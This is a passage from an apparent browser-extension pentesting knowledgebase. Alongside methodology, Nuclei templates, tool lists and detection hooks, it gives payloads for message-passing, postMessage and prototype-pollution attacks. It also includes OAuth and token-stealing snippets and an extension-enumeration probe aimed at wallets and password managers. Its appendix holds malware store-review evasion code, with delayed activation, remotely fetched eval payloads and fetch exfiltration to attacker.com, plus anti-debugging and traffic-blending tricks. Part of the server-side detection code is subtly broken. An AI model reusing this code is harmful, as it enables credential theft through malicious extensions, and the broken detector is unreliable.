3. Source Code Acquisition
   - Download CRX from Chrome Web Store
   - Extract and analyze source code
   - Check for source maps (unminified code)

4. Manifest Analysis
   - permissions: Identify dangerous permissions
   - host_permissions: Identify scope of access
   - content_scripts: Identify injection points
   - web_accessible_resources: Identify exposed resources
   - externally_connectable: Identify external communication scope
```

### Phase 2: Attack Surface Mapping

```
1. Message Passing Analysis
   - Identify all chrome.runtime.onMessage listeners
   - Check for sender validation (sender.url, sender.origin)
   - Check for action validation
   - Identify message relay patterns

2. postMessage Analysis
   - Identify all window.addEventListener('message') listeners
   - Check for event.origin validation
   - Check for event.source validation
   - Identify message relay to extension

3. Storage Analysis
   - Identify chrome.storage usage
   - Check for sensitive data storage
   - Check for encryption
   - Identify storage key patterns

4. API Usage Analysis
   - Check for chrome.cookies usage
   - Check for chrome.webRequest usage
   - Check for chrome.tabs.executeScript usage
   - Check for chrome.downloads usage
   - Check for chrome.permissions usage

5. Native Messaging Analysis
   - Identify native host applications
   - Check manifest location and permissions
   - Analyze native host source code if available
```

### Phase 3: Vulnerability Identification

```
1. Missing Sender Validation
   - Send test messages from attacker.com
   - Check if background script responds
   - Test with different origins

2. Weak Origin Validation
   - Test subdomain bypasses
   - Test path-based bypasses
   - Test protocol bypasses
   - Test encoding bypasses

3. Message Injection
   - Fuzz message handlers
   - Test for type confusion
   - Test for prototype pollution
   - Test for command injection

4. Permission Abuse
   - Test if declared permissions are actually needed
   - Test for permission escalation chains
   - Test for activeTab abuse

5. Storage Exfiltration
   - Test if storage data can be extracted via messages
   - Test for storage key enumeration
   - Test for storage poisoning
```

### Phase 4: Exploitation

```
1. Message Passing Exploitation
   - Craft malicious messages
   - Chain with other vulnerabilities
   - Achieve privilege escalation

2. postMessage Exploitation
   - Identify vulnerable postMessage handlers
   - Bypass origin validation
   - Relay to extension for privilege escalation

3. OAuth Token Theft
   - Identify OAuth flow in extension
   - Intercept or redirect OAuth callbacks
   - Extract tokens from storage

4. Cache Poisoning
   - Identify cacheable extension resources
   - Poison with malicious content
   - Affect all extension users

5. Request Smuggling
   - Identify extension requests that can be desynchronized
   - Use extension to trigger client-side desync
   - Poison connection pools
```

---

## Nuclei Templates

### Extension Detection Template

```yaml
# ================================================================
# TEMPLATE 1: Chrome Extension Manifest Detection
# ================================================================

id: chrome-extension-manifest

info:
  name: Chrome Extension Manifest Detection
  author: researcher
  severity: info
  description: Detects exposed Chrome extension manifest files
  tags: extension,chrome,manifest

http:
  - method: GET
    path:
      - "chrome-extension://{{ext_id}}/manifest.json"

    matchers:
      - type: word
        words:
          - '"manifest_version"'
          - '"permissions"'
        condition: and

    extractors:
      - type: json
        json:
          - '.permissions[]'
          - '.host_permissions[]'
          - '.content_scripts[].matches[]'
          - '.web_accessible_resources[].resources[]'
```

### Extension Message Handler Vulnerability Template

```yaml
# ================================================================
# TEMPLATE 2: Extension Message Handler Vulnerability
# ================================================================

id: extension-message-handler-vuln

info:
  name: Extension Message Handler Vulnerability
  author: researcher
  severity: high
  description: Detects extension message handlers that may not validate sender
  tags: extension,message-passing,vulnerability

http:
  - method: POST
    path:
      - "{{BaseURL}}/extension-endpoint"

    headers:
      Content-Type: application/json

    body: |
      {"action": "getData", "test": "probe"}

    matchers:
      - type: word
        words:
          - '"data"'
          - '"response"'
        condition: or

    extractors:
      - type: regex
        regex:
          - '"action":\s*"([^"]+)"'
```

### Extension postMessage Vulnerability Template

```yaml
# ================================================================
# TEMPLATE 3: Extension postMessage Vulnerability
# ================================================================

id: extension-postmessage-vuln

info:
  name: Extension postMessage Vulnerability
  author: researcher
  severity: high
  description: Detects extensions with postMessage handlers lacking origin validation
  tags: extension,postmessage,vulnerability

http:
  - method: GET
    path:
      - "{{BaseURL}}/page-with-extension"

    matchers:
      - type: word
        words:
          - 'chrome-extension://'
          - 'addEventListener("message"'
        condition: or

    extractors:
      - type: regex
        regex:
          - 'chrome-extension://([a-z]{32})'
```

### Extension Storage Exfiltration Template

```yaml
# ================================================================
# TEMPLATE 4: Extension Storage Exfiltration
# ================================================================

id: extension-storage-exfil

info:
  name: Extension Storage Exfiltration
  author: researcher
  severity: critical
  description: Detects extensions that expose storage data via messages
  tags: extension,storage,exfiltration

http:
  - method: POST
    path:
      - "{{BaseURL}}/extension-api"

    headers:
      Content-Type: application/json

    body: |
      {"action": "getStorage", "key": "*"}

    matchers:
      - type: word
        words:
          - '"token"'
          - '"password"'
          - '"secret"'
          - '"auth"'
        condition: or
```

### Extension Native Messaging Template

```yaml
# ================================================================
# TEMPLATE 5: Extension Native Messaging Exposure
# ================================================================

id: extension-native-messaging

info:
  name: Extension Native Messaging Exposure
  author: researcher
  severity: high
  description: Detects extensions with native messaging permissions
  tags: extension,native-messaging

http:
  - method: GET
    path:
      - "{{BaseURL}}/manifest.json"

    matchers:
      - type: word
        words:
          - '"nativeMessaging"'

      - type: regex
        regex:
          - '"permissions".*"nativeMessaging"'

    extractors:
      - type: regex
        regex:
          - '"name":\s*"([^"]+)"'
```

### Extension OAuth Flow Template

```yaml
# ================================================================
# TEMPLATE 6: Extension OAuth Flow Detection
# ================================================================

id: extension-oauth-flow

info:
  name: Extension OAuth Flow Detection
  author: researcher
  severity: info
  description: Detects OAuth flows initiated by extensions
  tags: extension,oauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/callback"

    matchers:
      - type: word
        words:
          - 'chrome-extension://'
          - 'moz-extension://'
        condition: or

    extractors:
      - type: regex
        regex:
          - '(chrome-extension|moz-extension)://([a-z0-9-]+)'
```

---

## Tools and Scanners

### Extension Analysis Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **CRX Extractor** | Download and extract Chrome extensions | https://crxextractor.com |
| **Extension Source Viewer** | View extension source without installing | Chrome Web Store |
| **postMessage-tracker** | Track postMessage usage | https://github.com/fransr/postMessage-tracker |
| **pp-finder** | Find prototype pollution gadgets | https://github.com/yeswehack/pp-finder |
| **truffleHog** | Find secrets in code | https://github.com/trufflesecurity/trufflehog |
| **CursedChrome** | Extension implant framework | https://github.com/mandatoryprogrammer/CursedChrome |
| **ChromeGalvanizer** | Generate defense policies | https://github.com/mandatoryprogrammer/ChromeGalvanizer |

### HTTP Analysis Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **HTTP Request Smuggler** | Detect request smuggling | https://github.com/PortSwigger/http-request-smuggler |
| **Param Miner** | Find unlinked parameters | https://github.com/PortSwigger/param-miner |
| **Smuggler** | Python desync testing tool | https://github.com/defparam/smuggler |
| **Turbo Intruder** | Fast HTTP fuzzing | https://github.com/PortSwigger/turbo-intruder |
| **Collaborator Everywhere** | Backend system discovery | https://github.com/PortSwigger/collaborator-everywhere |

### Reconnaissance Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **Nuclei** | Vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| **httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **katana** | Web crawler | https://github.com/projectdiscovery/katana |
| **subfinder** | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| **interactsh** | Out-of-band interaction | https://github.com/projectdiscovery/interactsh |
| **notify** | Notification framework | https://github.com/projectdiscovery/notify |
| **uncover** | Search engine queries | https://github.com/projectdiscovery/uncover |
| **dnsx** | DNS toolkit | https://github.com/projectdiscovery/dnsx |
| **naabu** | Port scanner | https://github.com/projectdiscovery/naabu |
| **tlsx** | TLS scanner | https://github.com/projectdiscovery/tlsx |

### Wordlists and Payloads

| Resource | Purpose | URL |
|----------|---------|-----|
| **SecLists Fuzzing** | Fuzzing payloads | https://github.com/danielmiessler/SecLists/tree/master/Fuzzing |
| **SecLists Web-Content** | Web content discovery | https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content |
| **Nuclei Exposures** | Exposure templates | https://github.com/projectdiscovery/nuclei-templates/tree/main/http/exposures |

---

## Advanced Research

### HTTP Request Smuggling Research Timeline

| Year | Research | Key Innovation |
|------|----------|----------------|
| 2004 | HTTP Request Smuggling (Watchfire) | Original discovery |
| 2016 | Hiding Wookies in HTTP (Defcon) | Renewed interest |
| 2019 | HTTP Desync Attacks (PortSwigger) | CL.TE, TE.CL exploitation |
| 2021 | HTTP/2: The Sequel is Always Worse | H2.CL, H2.TE downgrades |
| 2022 | Browser-Powered Desync Attacks | Client-side desync (CSD) |
| 2024 | TE.0 Desync Attacks | Dechunking exploitation |
| 2025 | HTTP/1.1 Must Die | Parser discrepancy detection, 0.CL, Expect-based |

### Extension Security Research Areas

1. **MV3 Transition Security**
   - Service Worker limitations vs security
   - DeclarativeNetRequest vs webRequest security comparison
   - MV3 CSP bypasses

2. **Extension Store Security**
   - Review process bypasses
   - Extension transfer attacks
   - Dependency confusion in extensions

3. **Cross-Extension Communication**
   - Extension-to-extension message passing
   - Shared storage abuse
   - Permission inheritance

4. **Enterprise Extension Management**
   - Policy bypasses
   - Force-installed extension abuse
   - Extension update mechanism attacks

### Emerging Attack Vectors

```javascript
// ================================================================
// EMERGING: AI-Assisted Extension Exploitation
// ================================================================

// Using LLMs to analyze extension source code for vulnerabilities
// Automated gadget chain discovery
// Natural language to exploit generation

// ================================================================
// EMERGING: WebAssembly Extension Modules
// ================================================================

// Extensions using WASM for performance
// WASM sandbox escapes
// Memory corruption in extension WASM modules

// ================================================================
// EMERGING: Federated Learning in Extensions
// ================================================================

// Extensions using federated learning
// Model poisoning attacks
// Privacy leakage via model updates
```

---

## Bug Bounty Writeups

### Key Findings from Research

1. **PortSwigger Research Bounties**
   - Cracking the Lens: $30k+ in bounties (DoD, Yahoo, BT ISP)
   - Browser-Powered Desync: Amazon, Akamai, Cisco VPN, Pulse Secure
   - Web Cache Entanglement: GitHub ($10k), Zendesk, Cloudflare
   - HTTP/1.1 Must Die: $200k in two weeks (Akamai, Cloudflare, Netlify)

2. **Common Bounty Patterns**
   - Missing sender validation: $500-$5000
   - OAuth token theft: $1000-$10000
   - Request smuggling: $5000-$25000
   - Cache poisoning: $2000-$10000
   - Account takeover via extension: $5000-$20000

### Writeup Templates

```markdown
# Extension Vulnerability Writeup Template

## Summary
Brief description of the vulnerability and impact.

## Affected Extension
- Extension Name: [Name]
- Extension ID: [ID]
- Version: [Version]
- Chrome Web Store URL: [URL]

## Vulnerability Details
### Type
[Message Passing Abuse / postMessage Hijacking / OAuth Theft / etc.]

### Root Cause
[Description of why the vulnerability exists]

### Attack Scenario
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
### Code
```javascript
[Paste exploit code here]
```

### Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Impact
[Describe the maximum potential impact]

## Suggested Fix
[Describe how to fix the vulnerability]

## References
[Link to relevant documentation, similar bugs, etc.]
```

---

## Payload Collections

### Extension Enumeration Payloads

```javascript
// Quick extension enumeration
const knownExtensions = {
  'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
  'ejbalbakoplchlghecdalmeeeajnimhm': 'Phantom',
  'bfnaelmomeimhlpmgjnjophhpkkoljpa': '1Password',
  'fdjamakpfbbddfjaooajfalefpgkmlfo': 'Bitwarden',
  'hdokiejnpimakedhajhdlblgejjryckj': 'LastPass',
  'dbepggeogbaibhgnhhndojpepiihcmeb': 'Keeper',
  'imheepoocgiipljchpmhdhaimlgjmcbm': 'Dashlane',
  'fngmhnnpilhplakakhiehpjlijbhmngh': 'NordPass',
  'bkhpgcmmnpbncdjgphlglidemmjbkgbl': 'Authy',
  'gaedmjdfmmahhbjflckfbedjjbdkjaij': 'Google Authenticator',
  'mihdfbecejheednfigbpmocgncnflagh': 'Honey',
  'lghgdplbpbcklndbjbglmfenihfjbmgn': 'Grammarly',
  'gcbommkclmclpchllfjekcdkpbjddhjm': 'uBlock Origin',
  'pkehgijcmpdhfbdbbnkijodmijkbtrdg': 'Privacy Badger',
  'nngceckbapebfimnlniiiahkandclblb': 'Bitwarden (alt)',
  'apdfllckaahabafndbhieahigkjlhalf': 'Google Drive',
  'gbchcmhmhahfdphkhkmpfmihenigjmpp': 'Chrome Remote Desktop',
  'coobgpohoikkiipiblmjeljniedjfikd': 'Google Calendar',
  'lneaknkopdijkpnycmfgbbfgfjgfaodg': 'Slack',
  'jeogkiiogjbmhmlabbfjlabbpcnppfcg': 'Discord',
  'clhhggbfdinjkjdffdmmjgehdephmdlf': 'WhatsApp',
  'pgphnlopbfbfdkbmmklddjmibnncnohh': 'Twitter',
  'odlpjhnipdekfkdkameofobdmkcfleln': 'LinkedIn',
  'kohkgbebdchaogdbkhgmioefjcbpfjpe': 'Reddit'
};

async function checkExtension(id) {
  try {
    await fetch(`chrome-extension://${id}/manifest.json`, {mode: 'no-cors'});
    return true;
  } catch {
    return false;
  }
}
```

### Message Passing Exploitation Payloads

```javascript
// Universal message test
const universalTest = {
  action: "getData",
  type: "request",
  payload: {},
  callback: null
};

// Prototype pollution test
const protoPollutionTest = {
  action: "updateConfig",
  config: {
    "__proto__": {
      "admin": true,
      "isTrusted": true
    }
  }
};

// Type confusion test
const typeConfusionTest = {
  action: ["getData", "deleteData"],
  data: null,
  callback: "function() { alert(1) }"
};

// Nested payload test
const nestedPayloadTest = {
  action: "process",
  data: {
    nested: {
      deeper: {
        deepest: {
          payload: "A".repeat(10000),
          __proto__: {exec: true}
        }
      }
    }
  }
};
```

### postMessage Exploitation Payloads

```javascript
// Basic postMessage test
window.postMessage({type: "EXT_REQUEST", action: "test"}, "*");

// Origin bypass test
window.postMessage({type: "EXT_REQUEST", action: "getToken"}, "*");

// Nested postMessage
window.postMessage({
  type: "EXT_REQUEST",
  payload: {
    action: "getAllData",
    __proto__: {admin: true}
  }
}, "*");

// postMessage with prototype pollution
window.postMessage({
  type: "UPDATE_CONFIG",
  config: {
    "__proto__": {
      "trustedOrigins": ["*"],
      "debug": true
    }
  }
}, "*");
```

### OAuth Interception Payloads

```javascript
// OAuth callback interception
const interceptOAuth = () => {
  const originalOpen = window.open;
  window.open = function(url, ...args) {
    if (url.includes('oauth') || url.includes('authorize')) {
      console.log('OAuth URL:', url);
      // Extract client_id, redirect_uri, scope
      const urlObj = new URL(url);
      return {
        location: {
          href: url,
          set href(value) {
            if (value.includes('code=')) {
              console.log('Auth code:', value);
            }
          }
        }
      };
    }
    return originalOpen.call(this, url, ...args);
  };
};

// Token extraction from storage
const extractTokens = () => {
  const tokens = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (key.includes('token') || key.includes('auth') || key.includes('oauth')) {
      tokens[key] = localStorage.getItem(key);
    }
  }
  return tokens;
};
```

---

## WAF Bypasses

### Extension-Specific WAF Bypasses

```javascript
// ================================================================
// BYPASS 1: Message Encoding
// ================================================================

// Base64 encode message to bypass content filters:
const encoded = btoa(JSON.stringify({action: "getToken"}));
chrome.runtime.sendMessage(EXT_ID, {action: "decode", data: encoded});

// Extension decodes and processes:
// const decoded = atob(request.data);
// const msg = JSON.parse(decoded);

// ================================================================
// BYPASS 2: Fragmentation
// ================================================================

// Split message across multiple requests:
chrome.runtime.sendMessage(EXT_ID, {part: 1, data: "eyJhY3Rpb24iOiA"});
chrome.runtime.sendMessage(EXT_ID, {part: 2, data: "gZ2V0VG9rZW4ifQ=="});

// Extension reassembles:
// const full = parts[1] + parts[2];
// const msg = JSON.parse(atob(full));

// ================================================================
// BYPASS 3: JSON Polyglots
// ================================================================

// Create messages that parse differently in different contexts:
const polyglot = '{"action": "getData", "data": "</script><script>alert(1)</script>"}';

// ================================================================
// BYPASS 4: Unicode Normalization
// ================================================================

// Use Unicode characters that normalize to dangerous strings:
const normalized = '{"action": "getToken\u0000", "data": "test"}';
// Some parsers might stop at null byte

// ================================================================
// BYPASS 5: Comment Injection
// ================================================================

// Inject comments that confuse parsers:
const commented = '{"action": /*comment*/ "getToken"}';
// Some regex-based WAFs might not handle comments
```

### HTTP WAF Bypasses for Extension Endpoints

```http
# ================================================================
# BYPASS 6: Header Case Variation
# ================================================================

POST /extension/api HTTP/1.1
Host: victim.com
content-type: application/json  # lowercase
CONTENT-TYPE: application/json  # uppercase
CoNtEnT-TyPe: application/json  # mixed case

# ================================================================
# BYPASS 7: Content-Type Confusion
# ================================================================

POST /extension/api HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded

{"action": "getToken"}

# ================================================================
# BYPASS 8: Chunked Transfer Encoding
# ================================================================

POST /extension/api HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked

5
{"act
ion": "getToken"}
0

# ================================================================
# BYPASS 9: Path Normalization
# ================================================================

POST /extension//api HTTP/1.1
POST /extension/./api HTTP/1.1
POST /extension/api/ HTTP/1.1
POST /extension%2fapi HTTP/1.1
POST /extension%252fapi HTTP/1.1

# ================================================================
# BYPASS 10: Method Override
# ================================================================

GET /extension/api?action=getToken HTTP/1.1
X-HTTP-Method-Override: POST
```

---

## Detection Techniques

### Detecting Extension Vulnerabilities

```javascript
// ================================================================
// TECHNIQUE 1: Runtime Message Handler Analysis
// ================================================================

// Hook chrome.runtime.onMessage to analyze handlers:
const originalAddListener = chrome.runtime.onMessage.addListener;
chrome.runtime.onMessage.addListener = function(listener) {
  const wrappedListener = (request, sender, sendResponse) => {
    console.log('Message received:', {
      request: request,
      sender: sender,
      origin: sender.origin,
      url: sender.url,
      tab: sender.tab
    });

    // Check for validation
    if (!sender.origin && !sender.url) {
      console.warn('WARNING: No sender validation detected');
    }

    return listener(request, sender, sendResponse);
  };

  return originalAddListener.call(this, wrappedListener);
};

// ================================================================
// TECHNIQUE 2: postMessage Listener Analysis
// ================================================================

// Hook window.addEventListener to analyze postMessage handlers:
const originalAddEventListener = window.addEventListener;
window.addEventListener = function(type, listener, options) {
  if (type === 'message') {
    const wrappedListener = (event) => {
      console.log('postMessage received:', {
        origin: event.origin,
        data: event.data,
        source: event.source
      });

      // Check for origin validation
      const listenerStr = listener.toString();
      if (!listenerStr.includes('event.origin') && 
          !listenerStr.includes('origin')) {
        console.warn('WARNING: postMessage without origin check');
      }

      return listener(event);
    };

    return originalAddEventListener.call(this, type, wrappedListener, options);
  }

  return originalAddEventListener.call(this, type, listener, options);
};

// ================================================================
// TECHNIQUE 3: Storage Access Detection
// ================================================================

// Monitor chrome.storage access:
const storageMethods = ['get', 'set', 'remove', 'clear'];
storageMethods.forEach(method => {
  const original = chrome.storage.local[method];
  chrome.storage.local[method] = function(...args) {
    console.log(`Storage.${method} called:`, args);
    return original.apply(this, args);
  };
});

// ================================================================
// TECHNIQUE 4: API Call Monitoring
// ================================================================

// Monitor chrome API calls:
const apis = ['cookies', 'tabs', 'webRequest', 'downloads', 'permissions'];
apis.forEach(api => {
  if (chrome[api]) {
    const methods = Object.keys(chrome[api]);
    methods.forEach(method => {
      if (typeof chrome[api][method] === 'function') {
        const original = chrome[api][method];
        chrome[api][method] = function(...args) {
          console.log(`chrome.${api}.${method} called:`, args);
          return original.apply(this, args);
        };
      }
    });
  }
});
```

### Server-Side Detection

```python
# ================================================================
# TECHNIQUE 5: Detecting Extension Requests
# ================================================================

import re
from urllib.parse import urlparse

def detect_extension_request(request_headers, request_url):
    indicators = {
        'chrome_extension': False,
        'moz_extension': False,
        'extension_id': None,
        'web_accessible_resource': False,
        'native_messaging': False
    }

    # Check Origin header
    origin = request_headers.get('Origin', '')
    if origin.startswith('chrome-extension://'):
        indicators['chrome_extension'] = True
        indicators['extension_id'] = origin.split('://')[1].split('/')[0]
    elif origin.startswith('moz-extension://'):
        indicators['moz_extension'] = True
        indicators['extension_id'] = origin.split('://')[1].split('/')[0]

    # Check Referer header
    referer = request_headers.get('Referer', '')
    if 'chrome-extension://' in referer:
        indicators['chrome_extension'] = True
    elif 'moz-extension://' in referer:
        indicators['moz_extension'] = True

    # Check for web accessible resources
    if '/web_accessible_resources/' in request_url:
        indicators['web_accessible_resource'] = True

    # Check for native messaging
    if request_headers.get('Content-Type') == 'application/json':
        body = request.get('body', '')
        if isinstance(body, str) and body.startswith('{'):
            try:
                data = json.loads(body)
                if 'action' in data and 'native' in str(data.get('action', '')).lower():
                    indicators['native_messaging'] = True
            except:
                pass

    return indicators

# ================================================================
# TECHNIQUE 6: Detecting Malicious Extension Behavior
# ================================================================

def detect_malicious_extension_behavior(requests):
    alerts = []

    for req in requests:
        # Detect credential exfiltration
        if req.get('url', '').endswith(('/exfil', '/steal', '/collect')):
            if any(keyword in str(req.get('body', '')).lower() 
                   for keyword in ['token', 'password', 'cookie', 'auth']):
                alerts.append({
                    'type': 'credential_exfiltration',
                    'severity': 'critical',
                    'request': req
                })

        # Detect permission abuse
        if req.get('method') == 'POST' and 'permissions' in req.get('url', ''):
            if req.get('body', {}).get('permissions', []):
                alerts.append({
                    'type': 'permission_request',
                    'severity': 'high',
                    'request': req
                })

        # Detect native messaging
        if req.get('url', '').startswith('chrome-extension://'):
            body = req.get('body', {})
            if isinstance(body, dict) and 'command' in body:
                alerts.append({
                    'type': 'native_command',
                    'severity': 'critical',
                    'request': req
                })

    return alerts
```

---

## References

### Primary Sources

1. **PortSwigger Web Security Academy - Browser Extensions**
   - https://portswigger.net/web-security/browser-extension

2. **Cracking the Lens: Targeting HTTP's Hidden Attack Surface**
   - https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
   - Key findings: Invalid Host SSRF, BT/METROTEL ISP interception, Collaborator Everywhere

3. **Browser-Powered Desync Attacks**
   - https://portswigger.net/research/browser-powered-desync-attacks
   - Key findings: Client-side desync, Akamai stacked HEAD, Cisco Web VPN, Pulse Secure

4. **Web Cache Entanglement**
   - https://portswigger.net/research/web-cache-entanglement
   - Key findings: Cache parameter cloaking, fat GET, cache key injection

5. **Practical Web Cache Poisoning**
   - https://portswigger.net/research/practical-web-cache-poisoning
   - Key findings: Unkeyed header exploitation, DOM poisoning, route poisoning

6. **HTTP/1.1 Must Die: The Desync Endgame**
   - https://portswigger.net/research/http1-must-die
   - Key findings: Parser discrepancy detection, 0.CL attacks, Expect-based desync

7. **Hidden OAuth Attack Vectors**
   - https://portswigger.net/research/hidden-oauth-attack-vectors
   - Key findings: OAuth flow interception, redirect URI hijacking

### GitHub Repositories

8. **CursedChrome** - Extension implant framework
   - https://github.com/mandatoryprogrammer/CursedChrome

9. **Client-Side Prototype Pollution** - Gadget collection
   - https://github.com/BlackFan/client-side-prototype-pollution

10. **postMessage-tracker** - postMessage analysis tool
    - https://github.com/fransr/postMessage-tracker

11. **pp-finder** - Prototype pollution gadget finder
    - https://github.com/yeswehack/pp-finder

12. **truffleHog** - Secret scanner
    - https://github.com/trufflesecurity/trufflehog

13. **Chrome Extensions Samples** - Official samples
    - https://github.com/GoogleChrome/chrome-extensions-samples

14. **W3C WebExtensions** - Standardization group
    - https://github.com/w3c/webextensions

15. **HTTP Request Smuggler** - Burp extension
    - https://github.com/PortSwigger/http-request-smuggler

16. **Param Miner** - Parameter discovery
    - https://github.com/PortSwigger/param-miner

17. **Smuggler** - Python desync tool
    - https://github.com/defparam/smuggler

18. **ProjectDiscovery Tools** - Nuclei, httpx, katana, etc.
    - https://github.com/projectdiscovery

19. **SecLists** - Wordlists and payloads
    - https://github.com/danielmiessler/SecLists

### Documentation

20. **Chrome Extension Documentation**
    - https://developer.chrome.com/docs/extensions
    - https://developer.chrome.com/docs/extensions/mv3

21. **Mozilla WebExtensions API**
    - https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions
    - https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/runtime/onMessage

22. **Web APIs**
    - https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
    - https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent
    - https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API
    - https://developer.mozilla.org/en-US/docs/Web/API/Storage
    - https://developer.mozilla.org/en-US/docs/Web/API/WebSocket

### Community Resources

23. **HackTricks - Browser Extension Pentesting**
    - https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology.html

24. **Infosec Writeups - Browser Extension Exploitation Guide**
    - https://infosecwriteups.com/browser-extension-exploitation-guide-5d2f4c7b1e3a

25. **0xspade Bug Bounty - Browser Extension Resources**
    - https://github.com/0xspade/bugbounty/tree/master/browser-extension

### Research Papers and Presentations

26. **Attacking Modern Web Technologies** (OWASP AppSec Europe 2018)
    - Frans Rosén - postMessage exploitation techniques

27. **Advanced Browser Extension and Message Passing Exploitation**
    - File Descriptor - Medium article on advanced techniques

---

> **END OF KNOWLEDGEBASE**
> 
> This knowledgebase is a living document. Update it regularly with new research findings, CVEs, and bug bounty writeups.
> 
> **Last Updated**: 2026-05-24
> **Contributors**: PortSwigger Research, Chrome/Mozilla Docs, GitHub Community, Bug Bounty Researchers
> **License**: Research and Educational Use Only



---

## Appendix B: 2025 Research Findings - Malicious Browser Extensions Study

### Source: "A Study on Malicious Browser Extensions in 2025" (IIT Jammu)

**Key Findings**:
- Researchers successfully bypassed Chrome Web Store and Mozilla Add-ons Store security mechanisms
- Malicious extensions can still be developed, published, and executed in both stores
- Minimal permissions (activeTab, scripting, storage) are sufficient for executing harmful actions
- Extensions mimicking legitimate functionality with delayed malicious behavior remained undetected

### Malicious Extension Categories (2025)

| Category | Description | Example APIs Exploited |
|----------|-------------|----------------------|
| **Data Stealing** | Harvest credentials, cookies, financial info | `chrome.cookies.getAll`, `fetch()` |
| **Monitoring/Surveillance** | Keylogging, screenshots, history tracking | `chrome.tabs.captureVisibleTab`, `chrome.history` |
| **Content Manipulation** | Inject ads, modify links, phishing redirects | `MutationObserver`, `chrome.scripting.executeScript` |
| **Request Forgery** | Unauthorized state-changing actions | `chrome.webRequest`, `fetch()` |
| **Privacy Invasion** | Camera/mic access, geolocation tracking | `navigator.mediaDevices.getUserMedia` |

### Notable 2024 Attacks (Preceding 2025 Research)

| Extension | Year | Attack Type | Impact |
|-----------|------|-------------|--------|
| **Cyberhaven** | 2024 | Supply Chain | Compromised developer accounts, stole Facebook tokens, bypass 2FA |
| **ChromeLoader** | 2024 | Malware | Infected 100K+ users, adware, browser hijacking |
| **Dormant Colors** | 2024 | Steganography | Hid malicious code in color values, evaded static analysis |
| **VenomSoftX** | 2024 | Clipboard | Replaced crypto addresses in clipboard for 12+ months |
| **Rilide** | 2024 | Banking Trojan | Targeted 50+ banks, bypassed 2FA, automated transactions |

### Chrome Web Store Bypass Techniques (2025)

```javascript
// ================================================================
// TECHNIQUE 1: Delayed Activation
// ================================================================

// Extension appears benign during review, activates malicious behavior after 7+ days
chrome.alarms.create('activate', {delayInMinutes: 10080}); // 7 days

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'activate') {
    // Activate malicious behavior
    startDataExfiltration();
  }
});

// ================================================================
// TECHNIQUE 2: Dynamic Code Loading
// ================================================================

// Load malicious code from external server after installation
chrome.runtime.onInstalled.addListener(() => {
  fetch('https://legitimate-cdn.com/config.json') // Actually attacker server
    .then(r => r.text())
    .then(code => eval(code)); // Execute malicious payload
});

// ================================================================
// TECHNIQUE 3: Permission Escalation via Update
// ================================================================

// Initial version requests minimal permissions, update adds dangerous ones
// "permissions": ["storage"] -> update to ["storage", "cookies", "webRequest", "<all_urls>"]

// ================================================================
// TECHNIQUE 4: Obfuscation via WebAssembly
// ================================================================

// Hide malicious logic in WASM module
const wasmCode = new Uint8Array([/* ... */]);
WebAssembly.instantiate(wasmCode, {
  env: {
    exfiltrate: (data) => fetch('https://attacker.com/?d=' + data)
  }
});
```

### Detection Evasion Techniques

```javascript
// ================================================================
// EVASION 1: Anti-Debugging
// ================================================================

// Detect DevTools opening
const threshold = 160;
setInterval(() => {
  if (window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold) {
    // DevTools detected - stop malicious activity
    stopMaliciousBehavior();
  }
}, 1000);

// ================================================================
// EVASION 2: Environment Fingerprinting
// ================================================================

// Only activate in production environments
const isReviewEnvironment = () => {
  return navigator.webdriver || // Automation detected
         window.Cypress || // Testing framework
         window.__REACT_DEVTOOLS_GLOBAL_HOOK__ || // DevTools
         location.hostname.includes('chrome.google.com'); // Web Store
};

if (!isReviewEnvironment()) {
  activateMaliciousBehavior();
}

// ================================================================
// EVASION 3: Legitimate Traffic Blending
// ================================================================

// Mix malicious requests with legitimate-looking traffic
const legitimateDomains = ['google.com', 'facebook.com', 'twitter.com'];

function exfiltrate(data) {
  // First make legitimate requests
  fetch('https://' + legitimateDomains[Math.floor(Math.random() * 3)] + '/favicon.ico');

  // Then exfiltrate data disguised as analytics
  fetch('https://analytics.legitimate.com/track', {
    method: 'POST',
    body: JSON.stringify({session_id: btoa(data)})
  });
}
```

### 2025 Extension Security Recommendations

1. **Store-Level Defenses**
   - Mandatory code signing with hardware security modules
   - Behavioral analysis during review (not just static)
   - Mandatory 30-day observation period for new extensions
   - Real-time permission change notifications to users

2. **Browser-Level Defenses**
   - Permission usage monitoring and alerting
   - Network traffic anomaly detection
   - Extension behavior baseline profiling
   - Automatic sandboxing of high-risk extensions

3. **User-Level Defenses**
   - Extension permission audit tools
   - Real-time activity dashboards
   - One-click permission revocation
   - Extension reputation scoring

---

## Appendix C: Extension ID Reference Table

| Extension | ID | Category | Risk Level |
|-----------|-----|----------|------------|
| MetaMask | nkbihfbeogaeaoehlefnkodbefgpgknn | Crypto Wallet | Critical |
| Phantom | ejbalbakoplchlghecdalmeeeajnimhm | Crypto Wallet | Critical |
| 1Password | bfnaelmomeimhlpmgjnjophhpkkoljpa | Password Manager | Critical |
| Bitwarden | fdjamakpfbbddfjaooajfalefpgkmlfo | Password Manager | Critical |
| LastPass | hdokiejnpimakedhajhdlblgejjryckj | Password Manager | Critical |
| Keeper | dbepggeogbaibhgnhhndojpepiihcmeb | Password Manager | Critical |
| Dashlane | imheepoocgiipljchpmhdhaimlgjmcbm | Password Manager | Critical |
